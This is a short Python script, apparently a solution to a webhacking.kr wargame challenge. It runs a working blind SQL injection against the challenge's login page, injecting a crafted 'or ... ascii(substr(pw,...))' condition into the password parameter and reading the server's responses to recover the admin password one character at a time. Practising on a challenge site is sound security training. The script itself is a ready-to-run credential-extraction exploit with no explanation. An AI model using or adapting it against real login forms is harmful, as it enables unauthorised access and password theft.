import requests
cookie={"PHPSESSID":"your id"}
ans=""
for i in range(0, 36):
    for j in range(36, 127):

        key_str = "' or id= 'admin' and ascii(substr(pw,{},1))={} -- ".format(i+1,j)
        print(key_str)
        params={"id":"admin", "pw":key_str}
        response = requests.get("https://webhacking.kr/challenge/bonus-1/?id=admin&pw="+key_str, params=params, cookies = cookie)
        if "wrong password" in response.text:
            ans=ans+chr(j)
            print('FLAG='+ans)
            break